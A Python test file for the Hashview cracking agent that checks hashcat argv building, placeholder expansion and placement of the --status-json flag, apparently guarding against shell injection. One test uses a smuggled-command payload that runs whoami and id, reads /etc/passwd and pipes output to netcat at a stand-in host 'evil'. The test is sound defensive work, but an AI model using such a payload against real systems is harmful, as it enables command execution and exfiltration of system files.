"""Agent-side argv execution (issue #297).

build_hashcat_argv decodes the server's stored command (a JSON argv list) into a
real argv, expands the @HASHCATBINPATH@ placeholder (plus any HC_EXTRA_ARGS), and
keeps free-form task fields as single literal tokens — so the crack runs with
shell=False and shell metacharacters in those fields are never interpreted.
"""
import importlib.util
import json
import os
import sys
import types
from pathlib import Path
from unittest import mock

AGENT_ROOT = Path(__file__).resolve().parents[2] / "install" / "hashview-agent"


def _load_agent_main():
    if "psutil" not in sys.modules:
        stub = types.ModuleType("psutil")

        class _PsutilError(Exception):
            pass

        stub.Error = _PsutilError
        stub.NoSuchProcess = type("NoSuchProcess", (_PsutilError,), {})
        stub.AccessDenied = type("AccessDenied", (_PsutilError,), {})
        stub.ZombieProcess = type("ZombieProcess", (_PsutilError,), {})
        stub.process_iter = lambda *a, **k: []
        sys.modules["psutil"] = stub

    real_exists = os.path.exists
    path = AGENT_ROOT / "hashview-agent.py"
    with mock.patch.object(sys, "argv", ["hashview-agent.py"]), \
         mock.patch(
             "os.path.exists",
             side_effect=lambda p: True if str(p).endswith("agent/config.conf") else real_exists(p),
         ):
        spec = importlib.util.spec_from_file_location("hashview_agent_main_argv", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
    return mod


agent_main = _load_agent_main()


def test_build_hashcat_argv_expands_binpath_and_keeps_payload_literal():
    payload = "?d?d ; whoami #`id`$(cat /etc/passwd)|nc evil 9"
    command = json.dumps(["@HASHCATBINPATH@", "-m", "1000", "-a", "3",
                          "control/hashes/h.txt", payload])
    argv = agent_main.build_hashcat_argv(command)

    assert argv[0] == "/usr/bin/hashcat"       # placeholder -> Config.HC_BIN_PATH
    assert argv[-1] == payload                 # injection payload is ONE literal token
    assert argv.count(payload) == 1
    assert ";" not in argv and "|" not in argv  # never split into shell-metachar tokens


def test_build_hashcat_argv_splits_hc_extra_args_into_tokens():
    cfg = sys.modules["agent.config"].Config
    original = cfg.HC_EXTRA_ARGS
    cfg.HC_EXTRA_ARGS = "-d 3,4"
    try:
        argv = agent_main.build_hashcat_argv(json.dumps(["@HASHCATBINPATH@", "-m", "0"]))
    finally:
        cfg.HC_EXTRA_ARGS = original

    # binary, then each HC_EXTRA_ARGS token separately, then the rest.
    assert argv[:4] == ["/usr/bin/hashcat", "-d", "3,4", "-m"]


# --------------------------------------------------- --status-json placement

def test_append_status_json_appends_when_there_is_no_sentinel():
    """Today's shape: no '--' in the command, so the flag goes on the end."""
    argv = ["/usr/bin/hashcat", "-a", "3", "hf.txt", "?d?d"]
    assert agent_main.append_status_json(argv) == [
        "/usr/bin/hashcat", "-a", "3", "hf.txt", "?d?d", "--status-json"]


def test_append_status_json_leaves_a_server_sentinel_command_alone():
    """The server emits '--status-json' and '--' as one pair in mask_attack_argv,
    and that is the only place it emits the flag at all. So a real sentinel always
    arrives with the flag already ahead of it, and there is nothing to do."""
    argv = ["/usr/bin/hashcat", "-a", "3", "--status-json", "--", "hf.txt", "-?d?d"]
    assert agent_main.append_status_json(list(argv)) == argv

    argv6 = ["/usr/bin/hashcat", "-a", "6", "--status-json", "--", "hf.txt", "wl.gz", "-?d"]
    out = agent_main.append_status_json(list(argv6))
    assert out.index("--status-json") < out.index("--")
    assert out[-3:] == ["hf.txt", "wl.gz", "-?d"]


def test_append_status_json_does_not_treat_an_operator_dash_dash_as_a_sentinel():
    """A mask field of '?d?d -- ?d' makes even a CURRENT server emit a bare '--'
    as an ordinary positional, with no --status-json anywhere:

        ['-a', '3', 'hf.txt', '?d?d', '--', '?d']

    Seeking to that '--' and inserting before it put the flag in front of a mask
    token and left hashcat with no mask, which it answers by running its own
    default mask. Nothing errors; the wrong keyspace is cracked."""
    argv = ["/usr/bin/hashcat", "-a", "3", "hf.txt", "?d?d", "--", "?d"]
    out = agent_main.append_status_json(list(argv))
    assert out == argv + ["--status-json"]
    assert out.index("--") < out.index("--status-json")


def test_append_status_json_is_a_noop_when_the_server_already_sent_it():
    """A server new enough to emit '--' emits the flag with it; don't duplicate."""
    argv = ["/usr/bin/hashcat", "-a", "3", "--status-json", "--", "hf.txt", "-?d"]
    assert agent_main.append_status_json(list(argv)) == argv
